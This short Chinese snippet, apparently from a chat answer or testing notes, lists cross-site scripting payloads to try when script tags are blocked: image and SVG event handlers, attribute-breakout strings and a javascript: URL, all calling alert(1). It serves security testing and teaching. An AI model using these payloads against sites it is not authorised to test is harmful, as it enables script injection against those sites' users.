# 试这些 payload，它们可能在 script 标签不管用的情况下生效：
# 1. 事件处理器型（不需要 script 标签）
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# 2. 如果输入会出现在 HTML 属性里（比如 input 的 value）
"><script>alert(1)</script>
" onfocus="alert(1)" autofocus="

# 3. 如果出现在 URL 里
javascript:alert(1)
